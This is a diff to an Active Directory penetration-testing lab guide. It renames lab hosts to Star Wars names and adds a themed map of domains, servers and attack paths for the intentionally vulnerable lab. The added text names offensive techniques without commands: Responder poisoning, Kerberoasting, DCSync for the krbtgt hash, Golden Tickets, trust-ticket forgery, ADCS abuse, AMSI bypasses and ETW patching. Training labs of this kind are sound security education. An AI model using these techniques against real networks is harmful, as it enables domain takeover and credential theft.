-| `dc01.eu.corp.local` (10.10.0.11) | [`hosts/dc01-eu.md`](hosts/dc01-eu.md) |
-| `ca01.corp.local` (10.10.0.12) | [`hosts/ca01-corp.md`](hosts/ca01-corp.md) |
-| `file01.corp.local` (10.10.0.13) | [`hosts/file01-corp.md`](hosts/file01-corp.md) |
-| `sql01.corp.local` (10.10.0.14) | [`hosts/sql01-corp.md`](hosts/sql01-corp.md) |
-| `ws01.corp.local` (10.10.0.100) | [`hosts/ws01-corp.md`](hosts/ws01-corp.md) |
-| `dc01.finance.local` (10.20.0.10) | [`hosts/dc01-finance.md`](hosts/dc01-finance.md) |
-| `dc01.root.corp` (10.30.0.10) | [`hosts/dc01-root.md`](hosts/dc01-root.md) |
+| `coruscant.empire.local` (10.10.0.10) | [`hosts/coruscant-corp.md`](hosts/coruscant-corp.md) |
+| `deathstar.eu.empire.local` (10.10.0.11) | [`hosts/coruscant-eu.md`](hosts/coruscant-eu.md) |
+| `endor.empire.local` (10.10.0.12) | [`hosts/endor-corp.md`](hosts/endor-corp.md) |
+| `scarif.empire.local` (10.10.0.13) | [`hosts/scarif-corp.md`](hosts/scarif-corp.md) |
+| `kamino.empire.local` (10.10.0.14) | [`hosts/kamino-corp.md`](hosts/kamino-corp.md) |
+| `tatooine.empire.local` (10.10.0.100) | [`hosts/tatooine-corp.md`](hosts/tatooine-corp.md) |
+| `yavin4.rebel.local` (10.20.0.10) | [`hosts/coruscant-finance.md`](hosts/coruscant-finance.md) |
+| `neimoidia.trade.corp` (10.30.0.10) | [`hosts/coruscant-root.md`](hosts/coruscant-root.md) |
 
 ---
 
 Next: [`03-credential-access.md`](03-credential-access.md). After enumeration you'll have hashes, tickets, sprayable passwords, ESC findings — that's where this turns into compromise.
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
